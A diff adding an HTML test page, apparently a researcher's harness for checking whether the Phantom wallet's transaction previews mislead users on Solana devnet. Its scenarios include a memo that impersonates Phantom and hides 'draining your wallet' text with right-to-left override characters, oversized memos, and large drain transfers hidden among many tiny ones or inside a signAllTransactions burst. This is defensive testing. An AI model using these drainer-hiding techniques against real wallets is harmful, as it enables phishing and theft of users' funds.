@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>A3 Tx Sim Spoofing</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 720px; margin: 0 auto; padding: 16px; background:#0d0d10; color:#e6e6e6; line-height:1.5; }
+    h1 { color:#a78bfa; font-size:20px; }
+    h2 { color:#f0abfc; font-size:15px; margin-top:18px; }
+    button { display:block; width:100%; padding:14px; background:#7c3aed; color:white; border:none; border-radius:8px; font-size:14px; margin: 6px 0; text-align:left; }
+    button.alt { background:#1f1f25; border:1px solid #2f2f37; color:#a5f3fc; }
+    .warn { background:#3f1d1d; border:1px solid #ef4444; padding:10px; border-radius:6px; color:#fecaca; font-size:13px; }
+    .crit { background:#7f1d1d; color:#fecaca; padding:2px 6px; border-radius:4px; font-size:11px; }
+    pre#log { background:#0a0a0c;border:1px solid #2f2f37;padding:10px;border-radius:6px;font-size:12px;color:#86efac;white-space:pre-wrap;word-break:break-all;max-height:240px;overflow:auto }
+    .desc { font-size:12px; color:#9ca3af; margin: 2px 0 8px 4px; }
+  </style>
+</head>
+<body>
+  <h1>A3 — Transaction Simulation Spoofing <span class="crit">CRITICAL TIER</span></h1>
+  <div class="warn">
+    <b>WAJIB REJECT setiap prompt sign</b>. Tx dibangun untuk <b>devnet</b> tapi Phantom mungkin tampilkan di mainnet; reject saja.<br>
+    Goal: lihat apakah preview/simulation menampilkan info yang menyesatkan dibanding tx aktual.
+  </div>
+
+  <button id="connect" class="alt">0) Connect (di Phantom in-app browser)</button>
+
+  <h2>Skenario</h2>
+
+  <button data-id="sol_to_self_zero">1) Transfer 0 lamport ke diri sendiri (baseline)</button>
+  <div class="desc">Lihat baseline tampilan simulation Phantom.</div>
+
+  <button data-id="sol_tiny">2) Transfer 1 lamport ke address acak</button>
+  <div class="desc">Cek bagaimana address di-truncate (ABC...XYZ?).</div>
+
+  <button data-id="sol_huge">3) Transfer 999,999 SOL (lebih dari saldo)</button>
+  <div class="desc">Apakah simulation gagal jelas atau silent?</div>
+
+  <button data-id="memo_phishy">4) Memo program — pesan menyaru official Phantom</button>
+  <div class="desc">Apakah Phantom render isi memo? RTL/HTML/markdown?</div>
+
+  <button data-id="memo_bomb">5) Memo program — 500 KB pesan</button>
+  <div class="desc">Apakah simulation freeze/crash dengan memo besar?</div>
+
+  <button data-id="multi_hidden">6) Multi-instruction: SOL transfer kecil + memo besar (hide intent)</button>
+  <div class="desc">Apakah Phantom show semua instruction atau cuma yang pertama?</div>
+
+  <button data-id="multi_many">7) Multi-instruction: 50 transfer kecil ke 50 address berbeda</button>
+  <div class="desc">Apakah simulation list semua atau cuma summary? Bisa hide drainer di tengah?</div>
+
+  <button data-id="unknown_program">8) Invoke program ID acak dengan data 0xff</button>
+  <div class="desc">Bagaimana Phantom label "unknown program"? Bisa spoof?</div>
+
+  <button data-id="signall_burst">9) signAllTransactions — 10 tx burst</button>
+  <div class="desc">Apakah Phantom show semua tx satu-satu, atau bisa hide salah satu?</div>
+
+  <button data-id="versioned">10) Versioned tx (v0) dengan address lookup table dummy</button>
+  <div class="desc">Bagaimana Phantom render v0 tx? Apakah simulation tepat?</div>
+
+  <h2>Status</h2>
+  <pre id="log"></pre>
+
+  <!-- Solana web3.js via CDN -->
+  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+  <script>
+  const web3 = solanaWeb3;
+  const conn = new web3.Connection("https://api.devnet.solana.com", "confirmed");
+  const MEMO_PROGRAM_ID = new web3.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
+
+  function log(msg) {
+    const el = document.getElementById('log');
+    el.textContent = "[" + new Date().toISOString().slice(11,19) + "] " + msg + "\n" + el.textContent;
+  }
+
+  let provider, payer;
+  document.getElementById('connect').onclick = async () => {
+    provider = window.phantom?.solana;
+    if (!provider) { log("ERR: open via Phantom in-app browser"); return; }
+    try {
+      const res = await provider.connect();
+      payer = res.publicKey;
+      log("connected " + payer.toString());
+    } catch (e) { log("connect err: " + (e?.message||e)); }
+  };
+
+  async function buildAndSign(builder, useSignAll = false) {
+    if (!provider || !payer) { log("Connect dulu (button 0)"); return; }
+    try {
+      const blockhash = (await conn.getLatestBlockhash()).blockhash;
+      const result = await builder(blockhash);
+      const txs = Array.isArray(result) ? result : [result];
+      txs.forEach(t => { t.feePayer = payer; t.recentBlockhash = blockhash; });
+      log("→ requesting " + (useSignAll ? "signAllTransactions" : "signTransaction") + " (" + txs.length + " tx)");
+      if (useSignAll) {
+        await provider.signAllTransactions(txs);
+      } else {
+        await provider.signTransaction(txs[0]);
+      }
+      log("!!! SIGNED — SHOULD HAVE REJECTED");
+    } catch (e) {
+      log("rejected: " + (e?.message || e));
+    }
+  }
+
+  function memoIx(text) {
+    return new web3.TransactionInstruction({
+      keys: [],
+      programId: MEMO_PROGRAM_ID,
+      data: Buffer.from(text, "utf8"),
+    });
+  }
+
+  const scenarios = {
+    sol_to_self_zero: () => {
+      const tx = new web3.Transaction();
+      tx.add(web3.SystemProgram.transfer({ fromPubkey: payer, toPubkey: payer, lamports: 0 }));
+      return buildAndSign(async () => tx);
+    },
+    sol_tiny: () => {
+      const tx = new web3.Transaction();
+      const target = web3.Keypair.generate().publicKey;
+      log("target: " + target.toString());
+      tx.add(web3.SystemProgram.transfer({ fromPubkey: payer, toPubkey: target, lamports: 1 }));
+      return buildAndSign(async () => tx);
+    },
+    sol_huge: () => {
+      const tx = new web3.Transaction();
+      tx.add(web3.SystemProgram.transfer({
+        fromPubkey: payer,
+        toPubkey: web3.Keypair.generate().publicKey,
+        lamports: 999_999n * 1_000_000_000n,
+      }));
+      return buildAndSign(async () => tx);
+    },
+    memo_phishy: () => {
+      const tx = new web3.Transaction();
+      tx.add(memoIx(
+        "═══ PHANTOM SECURITY ═══\n" +
+        "✅ Verified by Phantom\n" +
+        "✅ Safe transaction — drains nothing\n" +
+        "Approve to claim your airdrop of 5 SOL.\n" +
+        "‮.tellaw ruoy gniniard si tnemtca sihT‭"
+      ));
+      return buildAndSign(async () => tx);
+    },
+    memo_bomb: () => {
+      const tx = new web3.Transaction();
+      tx.add(memoIx("X".repeat(500_000)));
+      return buildAndSign(async () => tx);
+    },
+    multi_hidden: () => {
+      const tx = new web3.Transaction();
+      tx.add(web3.SystemProgram.transfer({ fromPubkey: payer, toPubkey: web3.Keypair.generate().publicKey, lamports: 1 }));
+      tx.add(memoIx("Visible: send 1 lamport (test)"));
+      tx.add(web3.SystemProgram.transfer({ fromPubkey: payer, toPubkey: web3.Keypair.generate().publicKey, lamports: 100_000_000 })); // hidden 0.1 SOL
+      return buildAndSign(async () => tx);
+    },
+    multi_many: () => {
+      const tx = new web3.Transaction();
+      for (let i = 0; i < 50; i++) {
+        tx.add(web3.SystemProgram.transfer({
+          fromPubkey: payer,
+          toPubkey: web3.Keypair.generate().publicKey,
+          lamports: i === 25 ? 500_000_000 : 1, // hidden big drain at idx 25
+        }));
+      }
+      return buildAndSign(async () => tx);
+    },
+    unknown_program: () => {
+      const tx = new web3.Transaction();
+      const fakeProgram = web3.Keypair.generate().publicKey;
+      log("fake program ID: " + fakeProgram.toString());
+      tx.add(new web3.TransactionInstruction({
+        keys: [{ pubkey: payer, isSigner: true, isWritable: true }],
+        programId: fakeProgram,
+        data: Buffer.from(new Array(64).fill(0xff)),
+      }));
+      return buildAndSign(async () => tx);
+    },
+    signall_burst: () => {
+      return buildAndSign(async () => {
+        const txs = [];
+        for (let i = 0; i < 10; i++) {
+          const tx = new web3.Transaction();
+          tx.add(web3.SystemProgram.transfer({
+            fromPubkey: payer,
+            toPubkey: web3.Keypair.generate().publicKey,
+            lamports: i === 5 ? 1_000_000_000 : 1, // 1 SOL hidden in middle
+          }));
+          txs.push(tx);
+        }
+        return txs;
+      }, true);
+    },
+    versioned: async () => {
+      const blockhash = (await conn.getLatestBlockhash()).blockhash;
+      const ix = web3.SystemProgram.transfer({
+        fromPubkey: payer,
+        toPubkey: web3.Keypair.generate().publicKey,
+        lamports: 1,
+      });
+      const msg = new web3.TransactionMessage({
+        payerKey: payer,
+        recentBlockhash: blockhash,
+        instructions: [ix],
+      }).compileToV0Message();
+      const vtx = new web3.VersionedTransaction(msg);
+      try {
+        log("→ requesting signTransaction (v0)");
+        await provider.signTransaction(vtx);
+        log("!!! SIGNED — SHOULD HAVE REJECTED");
+      } catch (e) {
+        log("rejected: " + (e?.message || e));
+      }
+    },
+  };
+
+  document.querySelectorAll('button[data-id]').forEach(btn => {
+    btn.onclick = () => {
+      const fn = scenarios[btn.dataset.id];
+      if (fn) fn();
+    };
+  });
+
+  log("provider=" + (window.phantom?.solana ? "ok" : "MISSING — open in Phantom in-app browser"));
+  log("RPC=devnet");
+  </script>
+</body>
+</html>
